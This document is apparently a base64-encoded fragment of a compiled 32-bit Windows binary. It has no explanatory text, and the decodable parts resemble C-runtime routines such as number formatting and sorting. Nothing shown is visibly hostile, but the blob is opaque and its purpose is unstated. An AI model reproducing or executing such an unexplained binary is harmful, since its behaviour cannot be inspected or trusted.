0LYuFfPj//2hk8UEAg2AEAP91HP+1nPj//+irmf//g8QMhcAPhQkUAADp3RMAAI1FCFDozrL//1mFwHQJi418+P//iVkEg+gBD4ShEwAAg+gBD4SOEwAAg+gBD4R7EwAAg+gBD4RoEwAAi0UIgeb///9/g6WE+P//AIlFCItFEIl1DEDdRQjdlaT4//+Ltaj4//+LzomFiPj//8HpFIvBJf8HAACDyAB1CjPSiZ2w+P//6w0zwLoAABAAIYWw+P//i72k+P//geb//w8AA/iLhbD4//+JvYz4//8T8oHh/wcAAAPBiYW4+P//6HEpAABRUd0cJOh3KgAAWVnocE8AAImFlPj//2ogXz3///9/dAc9AAAAgHUIM8CJhZT4//+Llbj4//8zyYuFjPj//4X2iYUw/v//D5XBibU0/v//QYmNoPj//4mNLP7//4H6MwQAAA+CmQMAAIOlkPr//wDHhZT6//8AABAAx4WM+v//AgAAAIX2D4TeAQAAM8mLhA2Q+v//O4QNMP7//w+FyAEAAIPBBIP5CHXkjYrP+///i/eLwTPSg+EfwegFK/GJhaz4//+JjZj4//+Lw4vOibW0+P//6AlOAACLlaD4//9Ig6Wo+P//AImFkPj///fQiYWM+P//i4yVLP7//w+9wXQJQImFsPj//+sHg6Ww+P//AIuNrPj//77MAQAAjQQKg/hzdiszwFCJhYz6//+JhSz+//+NhZD6//9QjYUw/v//VlDoI8///4PEEOniAAAAK72w+P//O72Y+P//G8D32APCA8GJhaj4//+D+HN3to15/0iJvYT4//+Jhbj4//87xw+EkQAAAIv4K/mNjSz+//+NDLmJjaD4//87+nMFi0EE6wIzwImFsPj//41H/zvCcwSLAesCM8AjhYz4//+LjbT4//+LlbD4//8jlZD4///T6IuNmPj//9Pii424+P//C8KJhI0w/v//i8GLjaD4//9Ig+kEiYW4+P//T4mNoPj//zuFhPj//3QIi5Us/v//64iLjaz4//+FyXQKM8CNvTD+///zq4uFqPj//4mFLP7//2oEWImFkPr//1CDpZT6//8AjYWQ+v//UI2FYPz//4mdXPz//1ZQiZ2M+v//6AjO//+DxBDpygMAAI2Kzvv//4v3i8Ez0oPhH8HoBSvxiYWY+P//iY2w+P//i8OLzom1hPj//+hJTAAAi5Wg+P//SIOltPj//wCJhYz4///30ImFqPj//4uMlSz+//8PvcF0CUCJhaz4///rB4OlrPj//wCLjZj4//++zAEAAI0ECoP4c3YrM8BQiYWM+v//iYUs/v//jYWQ+v//UI2FMP7//1ZQ6GPN//+DxBDp4gAAACu9rPj//zu9sPj//xvA99gDwgPBiYWQ+P//g/hzd7aNef9Iib20+P//iYW4+P//O8cPhJEAAACL+Cv5jY0s/v//jQy5iY2g+P//O/pzBYtBBOsCM8CJhaz4//+NR/87wnMEiwHrAjPAI4Wo+P//i42E+P//i5Ws+P//I5WM+P//0+iLjbD4///T4ouNuPj//wvCiYSNMP7//4vBi42g+P//SIPpBImFuPj//0+JjaD4//87hbT4//90CIuVLP7//+uIi42Y+P//hcl0CjPAjb0w/v//86uLhZD4//+JhSz+///HhZD6//8CAAAAagTpOf7//4P6NQ+EFAEAAIOlkPr//wDHhZT6//8AABAAx4WM+v//AgAAAIX2D4TxAAAAM9KLhBWQ+v//O4QVMP7//w+F2wAAAIPCBIP6CHXkM9sPvcaJnaj4//90A0DrAovDK/iD/wIb9vfeA/GD/nN2KlONhZD6//+JnYz6//9QjYUw/v//iZ0s/v//aMwBAABQ6NfL//+DxBDrTY1W/4P6/3Q/jXr/O9FzCYuElTD+///rAovDO/lzCYuMlSz+///rAovLwekeweACC8iJjJUw/v//Sk+D+v90CIuNLP7//+vEibUs/v//uzUEAACNhZD6//8rnbj4//+L+8HvBYv3weYCVmoAUOj5G///g+MfM8BAi8vT4ImENZD6///p4wAAADPAhfYPlcCDpaj4//8AjQSFBAAAAIuEBSz+//8PvcB0A0DrAjPAK/g7+xv2994D8YP+c3Ytg6WM+v//AI2FkPr//4OlLP7//wBqAFCNhTD+//9ozAEAAFDo7sr//4PEEOtMjVb/g/r/dD6Nev870XMJi4SVMP7//+sCM8A7+XMJi4yVLP7//+sCM8nB6R8DwAvIiYyVMP7//0pPg/r/dAiLjSz+///rxYm1LP7//7s0BAAAjYWQ+v//K524+P//i/vB7wWL98HmAlZqAFDoERv//4PjHzPAQIvL0+CJhDWQ+v//jUcBvswBAACJhYz6//+JhVz8///B4AJQjYWQ+v//UI2FYPz//1ZQ6DzK//8z24PEHEOLhZT4//8z0moKWYmNjPj//4XAD4jdBAAA9/GJhbT4//+LyomNhPj//4XAD4TaAwAAg/gmdgNqJlgPtgyFpvBBAA+2NIWn8EEAi/mJhbD4///B5wJXjQQxiYWM+v//jYWQ+v//agBQ6GIa//+LxsHgAlCLhbD4//8PtwSFpPBBAI0EhaDnQQBQjYWQ+v//A8dQ6Jgu//+LvYz6//+DxBg7+w+HzAAAAIu9kPr//4X/dTYzwFCJhbz4//+JhVz8//+NhcD4//9QjYVg/P//aMwBAABQ6F7J//+DxBCKw77MAQAA6QIDAAA7+3Twg71c/P//AHTni4Vc/P//M8mJhaj4//8z9ovH96S1YPz//wPBiYS1YPz//4PSAEaLyju1qPj//3Xghcl0s4uFXPz//4P4c3MPiYyFYPz///+FXPz//+uZM8BQiYWM+v//iYVc/P//jYWQ+v//UI2FYPz//2jMAQAAUOjNyP//g8QQMsDpav///zmdXPz//w+H3gAAAIuFYPz//77MAQAAiYWs+P//i8fB4AJQjYWQ+v//ib1c/P//UI2FYPz//1ZQ6IbI//+Lhaz4//+DxBCFwHUYiYWM+v//iYVc/P//UI2FkPr//+kBAgAAO8MPhAoCAACDvVz8//8AD4T9AQAAi41c/P//iY2o+P//M8kz//ekvWD8//8DwYmEvWD8//+Lhaz4//+D0gBHi8o7vaj4//913IXJD4TBAQAAi4Vc/P//g/hzcxKJjIVg/P///4Vc/P//6aQBAAAzwImFjPr//4mFXPz//1CNhZD6///p8gEAADu9XPz//42VkPr//w+SwHIGjZVg/P//iZWY+P//jY1g/P//hMB1Bo2NkPr//4mNrPj//4TAdAqLz4m9kPj//+sMi41c/P//iY2Q+P//hMB0Bou9XPz//zPAM/aJhbz4//+FyQ+E+wAAAIM8sgB1HjvwD4XkAAAAg6S1wPj//wCNRgGJhbz4///pzgAAADPSi84hlbj4//+JlaD4//+F/w+EoQAAAIP5c3RkO8h1F4uFuPj//4OkjcD4//8AQAPGiYW8+P//i4W4+P//i5Ws+P//iwSCi5WY+P//9ySyA4Wg+P//g9IAAYSNwPj//4uFuPj//4PSAEBBiYW4+P//O8eJlaD4//+Lhbz4//91l4XSdDSD+XMPhL0AAAA7yHURg6SNwPj//wCNQQGJhbz4//+LwjPSAYSNwPj//4uFvPj//xPSQevIg/lzD4SJAAAAi42Q+P//i5WY+P//RjvxD4UF////iYVc/P//vswBAADB4AJQjYXA+P//UI2FYPz//1ZQ6FLG//+DxBCKw4TAdHeLhbT4//8rhbD4//+JhbT4//8PhSz8//+LjYT4//+FyQ+EtQUAAIsEjTzxQQCJhaj4//+FwHViM8CJhZz2//+JhVz8//9Q6z8zwL7MAQAAiYWc9v//iYVc/P//UI2FoPb//1CNhWD8//9WUOjZxf//g8QQMsDrhYOlnPb//wCDpVz8//8AagCNhaD2//9QjYVg/P//6TgFAAA7ww+EOgUAAIuNXPz//4XJD4QsBQAAg6W0+P//ADP/96S9YPz//wOFtPj//4mEvWD8//+Lhaj4//+D0gBHiZW0+P//O/l12IXSD4TzBAAAi4Vc/P//g/hzD4NA////iZSFYPz///+FXPz//+nSBAAA99j38YmFoPj//4vKiY2E+P//hcAPhMgDAACD+CZ2A2omWA+2DIWm8EEAD7Y0hafwQQCL+YmFmPj//8HnAleNBDGJhYz6//+NhZD6//9qAFDogxX//4vGweACUIuFmPj//w+3BIWk8EEAjQSFoOdBAFCNhZD6//8Dx1DouSn//4u9jPr//4PEGDv7D4fMAAAAi72Q+v//hf91NjPAUImFnPb//4mFLP7//42FoPb//1CNhTD+//9ozAEAAFDof8T//4PEEIrDvswBAADp7AIAADv7dPCDvSz+//8AdOeLhSz+//8zyYmFqPj//zP2i8f3pLUw/v//A8GJhLUw/v//g9IARovKO7Wo+P//deCFyXSzi4Us/v//g/hzcw+JjIUw/v///4Us/v//65kzwFCJhZz2//+JhSz+//+NhaD2//9QjYUw/v//aMwBAABQ6O7D//+DxBAywOlq////OZ0s/v//D4fIAAAAi4Uw/v//vswBAACJhbT4//+Lx8HgAlCNhZD6//+JvSz+//9QjYUw/v//VlDop8P//4uFtPj//4PEEIXAdRiJhZz2//+JhSz+//9QjYWg9v//6esBAAA7ww+E9AEAAIO9LP7//wAPhOcBAACLjSz+//+Jjaj4//8zyTP/96S9MP7//wPBiYS9MP7//4uFtPj//4PSAEeLyju9qPj//3XchckPhKsBAACLhSz+//+D+HMPg08CAACJjIUw/v///4Us/v//6YoBAAA7vSz+//+NlZD6//8PksByBo2VMP7//4mVsPj//42NMP7//4TAdQaNjZD6//+JjbT4//+EwHQKi8+Jvaz4///rDIuNLP7//4mNrPj//4TAdAaLvSz+//8zwDP2iYW8+P//hckPhPsAAACDPLIAdR478A+F5AAAAIOktcD4//8AjUYBiYW8+P//6c4AAAAz0ovOIZW4+P//iZWQ+P//hf8PhKEAAACD+XN0ZDvIdReLhbj4//+DpI3A+P//AEADxomFvPj//4uFuPj//4uVtPj//4sEgouVsPj///cksgOFkPj//4PSAAGEjcD4//+Lhbj4//+D0gBAQYmFuPj//zvHiZWQ+P//i4W8+P//dZeF0nQ0g/lzD4QdAQAAO8h1EYOkjcD4//8AjUEBiYW8+P//i8Iz0gGEjcD4//+Lhbz4//8T0kHryIP5cw+E6QAAAIuNrPj//4uVsPj//0Y78Q+FBf///4mFLP7//77MAQAAweACUI2FwPj//1CNhTD+//9WUOiJwf//g8QQisOEwA+E1gAAAIuFoPj//yuFmPj//4mFoPj//w+FPvz//4uNhPj//4XJD4ToAAAAiwSNPPFBAImFqPj//4XAD4StAAAAO8MPhMsAAACLjSz+//+FyQ+EvQAAAIOltPj//wAz//ekvTD+//8DhbT4//+JhL0w/v//i4Wo+P//g9IAR4mVtPj//zv5ddiF0g+EhAAAAIuFLP7//4P4c3NTiZSFMP7///+FLP7//+tqvswBAAAzwFCJhZz2//+JhSz+//+NhaD2//9QjYUw/v//VlDosMD//4PEEDLA6SL///+DpZz2//8Ag6Us/v//AGoA6w8zwFCJhSz+//+JhZz2//+NhaD2//9QjYUw/v//VlDoccD//4PEEIuNLP7//4u9nPj//4m9uPj//4XJdHqDpbT4//8AM/+LhL0w/v//agpa9+IDhbT4//+JhL0w/v//g9IAR4mVtPj//zv5ddmLvbj4//+F0nRAi4Us/v//g/hzcw+JlIUw/v///4Us/v//6yYzwFCJhZz2//+JhSz+//+NhaD2//9QjYUw/v//VlDo4b///4PEEI2FXPz//1CNhSz+//9Q6BPp//9ZWYuNnPj//2oKWjvCD4VGAQAAi4Vc/P//jXkB/4WU+P//xgExib24+P//iYWo+P//hcB0XzP/M8mLhI1g/P//9+JqCgPHiYSNYPz//4PSAEGL+lo7jaj4//913Ym9qPj//4X/i724+P//dCKLjVz8//+D+XMPg7MAAACLhaj4//+JhI1g/P///4Vc/P//i42c+P//i4WU+P//i5V8+P//iUIEi5WI+P//hcB4CoH6////f3cCA9CLRRxIO8JyAovCA8GJhbT4//87+A+EXwEAAIuFLP7//4XAD4RRAQAAM9uL+DPJi4SNMP7//7oAypo79+IDw4mEjTD+//+D0gBBi9o7z3Xfi724+P//hdsPhI0AAACLhSz+//+D+HNzXImchTD+////hSz+///rczPAUImFnPb//4mFXPz//42FoPb//1CNhWD8//9WUOh6vv//g8QQ6TX///+FwHUMi4WU+P//SOkx////BDCNeQGIAYm9uPj//+kZ////M8BQiYWc9v//iYUs/v//jYWg9v//UI2FMP7//1ZQ6C2+//+DxBCNhVz8//9QjYUs/v//UOhf5///g70s/v//AFlZi420+P//D5TDx4WI+P//CAAAACvPM9L3tYz4//+JhYT4//+LwomVqPj//wQwi5WI+P//O8pzCzwwD5XA/sgi2OsDiAQ6i4WE+P//SomViPj//4P6/3W+g/kJdgNqCVkD+Ym9uPj//zu9tPj//w+Fof7//zPAxgcAhNsPlcCJhaj4//+L2Os6aIDxQQDpNez//2h48UEA6Svs//9ocPFBAOkh7P//aGjxQQD/dRz/tZz4///ox4X//4PEDIXAdSkz24C9ePj//wBfXnQNjYVw+P//UOigFQAAWYtN/IvDM81b6AD4/v/JwzPAUFBQUFDoWXX//8zoiBsAAFDoYBsAAFnDi/9Vi+z/dQzoFKv//4tFDFmLQAyQqAZ1HOjCh///xwAJAAAAi0UMahBZg8AM8AkIg8j/XcOLRQyLQAyQwegMqAF0DeiYh///xwAiAAAA69SLRQyLQAyQqAF0KP91DOgbAwAAWYtNDINhCACEwItFDHS1i0gEiQiLRQxq/lmDwAzwIQiLRQxqAlmDwAzwCQiLRQxq91mDwAzwIQiLRQyDYAgAi0UMi0AMkKnABAAAdRb/dQzozqr//1mEwHUJ/3UM6FIdAABZU/91DItdCFPoEQEAAFlZhMB1EYtFDGoQWYPADPAJCIPI/+sDD7bDW13Di/9Vi+z/dQzoJKr//4tFDFmLQAyQqAZ1HujShv//xwAJAAAAi0UMahBZg8AM8AkIuP//AABdw4tFDItADJDB6AyoAXQN6KaG///HACIAAADr0otFDItADJCoAXQo/3UM6CkCAABZi00Mg2EIAITAi0UMdLOLSASJCItFDGr+WYPADPAhCItFDGoCWYPADPAJCItFDGr3WYPADPAhCItFDINgCACLRQyLQAyQqcAEAAB1Fv91DOjcqf//WYTAdQn/dQzoYBwAAFlW/3UMi3UIVujrAAAAWVmEwHUTi0UMahBZg8AM8AkIuP//AADrAw+3xl5dw4v/VYvsVlf/dQzoLqn//1mLTQyL0ItJDJD2wcAPhJAAAACLTQwz/4tBBIsxK/BAiQGLRQyLSBhJiUgIhfZ+JItFDFb/cARS6H3d//+DxAyL+ItFDDv+i0gEikUIiAEPlMDrZYP6/3Qbg/r+dBaLwovKg+A/wfkGa8A4AwSNOENCAOsFuPgwQgD2QCggdMNqAldXUujOEAAAI8KDxBCD+P91r4tFDGoQWYPADPAJCLAB6xZqAY1FCFBS6Avd//+DxAxI99gawP7AX15dw4v/VYvsVlf/dQzoYqj//1mLTQyL0ItJDJD2wcAPhJMAAACLTQwz/4tBBIsxK/CDwAKJAYtFDItIGIPpAolICIX2fiOLRQxW/3AEUuit3P//g8QMi/iLRQw7/otIBGaLRQhmiQHrYYP6/3Qbg/r+dBaLwovKg+A/wfkGa8A4AwSNOENCAOsFuPgwQgD2QCggdMRqAldXUuj/DwAAI8KDxBCD+P91sItFDGoQWYPADPAJCLAB6xVqAo1FCFBS6Dzc//+DxAyD+AIPlMBfXl3Di/9Vi+yLRQiD7BCLQAyQwegDqAF0BLABycOLRQhTVotADJCowItFCHQHiwg7SAR0TotAEJBQ6IrA//+L8FmD/v90PDPbjUX4Q1NQagBqAFb/FTiQQQCFwHQljUXwUFb/FTyQQQCFwHQWi0X4O0XwdQiLRfw7RfR0AjLbisPrAjLAXlvJw4v/VYvsXeny+///i/9Vi+xd6df8//+L/1WL7ItNCIP5/nUN6LWD///HAAkAAADrOIXJeCQ7DThFQgBzHIvBg+E/wfgGa8k4iwSFOENCAA+2RAgog+BAXcPogIP//8cACQAAAOizcP//M8Bdw4v/VYvsUVGLVQxWi3UQD7fKV4X2dQW+iEVCAIM+AI2BACQAAA+3wHU8v/8DAABmO8d3CVboHeD//1nrWo2CACgAAGY7x3cSgeH/J///g8FAweEKM8CJDus9VlH/dQjoEuD//+suuf8DAABmO8F3xI1F+DP/UA+3wiX/I///iX34AwZQ/3UIiX386Off//+JPol+BIPEDF9eycOL/1WL7P91FP91EP91DP91CP8VTJBBAF3DzMyL/1WL7IHsGAEAAKEEMEIAM8WJRfyLTQxTi10UVot1CIm1/P7//4md+P7//1eLfRCJvQD///+F9nUlhcl0Ieh5gv//xwAWAAAA6Kxv//+LTfxfXjPNW+hl8v7/i+Vdw4X/dNuF23TXx4Xo/v//AAAAAIP5AnLYSQ+vzwPOiY0I////i8Ez0ivG9/dAg/gID4e2AAAAO84PhicEAACNFDeJlfD+//+LxovyiYUE////O/F3L1BWi8v/FcCRQQD/04PECIXAfgqLxomFBP///+sGi4UE////i40I////A/c78XbRib30/v//i9E7wXQ7K8GL34mFBP///+sGjZsAAAAAigwQjVIBi7UE////ikL/iEQW/4vGiEr/g+sBdeOLnfj+//+LjQj///+Ltfz+//8rz4uV8P7//4mNCP///zvOD4dg////6XkDAADR6IvLD6/HiYUE////jTwwV1aJvez+////FcCRQQD/04u1AP///4PECIXAi4X8/v//fk2JtfT+//+JvfD+//87x3Q9i530/v//i/eLvQT////rA41JAIoGi9Yr14oKiAKIDkaD6wF17ou97P7//4ud+P7//4u1AP///4uF/P7///+1CP///4vLUP8VwJFBAP/Ti5UI////g8QIhcB+SYuF/P7//4m17P7//4vyO8J0N4ud7P7//yvCiYXw/v//i9CNmwAAAACKBo12AYpMMv+IRDL/iE7/g+sBdeuLnfj+//+LlQj///9SV4vL/xXAkUEA/9OLlQj///+DxAiFwIuFAP///341i9iL8jv6dC2LxyvCiYXs/v//i9CKBo12AYpMMv+IRDL/iE7/g+sBdeuLhQD///+LlQj///+Ltfz+//+L2omVBP///zv+dj7rB42kJAAAAAAD8Im19P7//zv3cyOLjfj+//9XVv8VwJFBAP+V+P7//4PECIXAi4UA////ftPrQouVCP///4ud+P7//+sDjUkAA/A78ncfV1aLy/8VwJFBAP/Ti5UI////g8QIhcCLhQD///9+24udBP///4m19P7//4u1+P7//+sHjaQkAAAAAIuFAP///4vLK9iJjQT///8733YfV1OLzv8VwJFBAP/Wg8QIhcB/2YuFAP///4uNBP///4u19P7//4mdBP///zveckqJhfD+//+L03QrK/OL2IoCjVIBikwW/4hEFv+ISv+D6wF164u19P7//4udBP///4uFAP///4uVCP///zv7D4Xt/v//i/7p5v7//zv5czyLnfj+///rB42kJAAAAAAryImNBP///zvPdiFXUYvL/xXAkUEA/9OLjQT///+DxAiFwIuFAP///3TV60SLnfj+//+Ltfz+//+NpCQAAAAAK8iJjQT///87znYfV1GLy/8VwJFBAP/Ti40E////g8QIhcCLhQD///901Yu19P7//4uVCP///4vKi70E////K86LxyuF/P7//zvBfD2Lhfz+//87x3MYi43o/v//iUSNhIm8jQz///9BiY3o/v//i40I////i70A////O/FzRIm1/P7//+n4+///O/JzGIuF6P7//4l0hYSJlIUM////QImF6P7//4u1/P7//zv3cw2Lz4u9AP///+m/+///i70A////i4Xo/v//g+gBiYXo/v//D4h2+///i3SFhIuMhQz///+Jtfz+///pjvv//8zMVYvsVjPAUFBQUFBQUFCLVQyNSQCKAgrAdAmDwgEPqwQk6/GLdQiL/4oGCsB0DIPGAQ+jBCRz8Y1G/4PEIF7Jw4v/VYvsUVGhBDBCADPFiUX8U1aLdRhXhfZ+FFb/dRTo+xMAAFk7xlmNcAF8Aovwi30khf91C4tFCIsAi3gIiX0kM8A5RShqAGoAD5XAVv91FI0ExQEAAABQV+jasv//i9CDxBiJVfiF0g+EWAEAAI0EEo1ICDvBG8AjwXQ1PQAEAAB3E+jnMAAAi9yF23QexwPMzAAA6xNQ6HuH//+L2FmF23QJxwPd3QAAg8MIi1X46wIz24XbD4QAAQAAUlNW/3UUagFX6G+y//+DxBiFwA+E5wAAAIt9+DPAUFBQUFBXU/91EP91DOjJgP//i/CF9g+ExgAAALoABAAAhVUQdDiLRSC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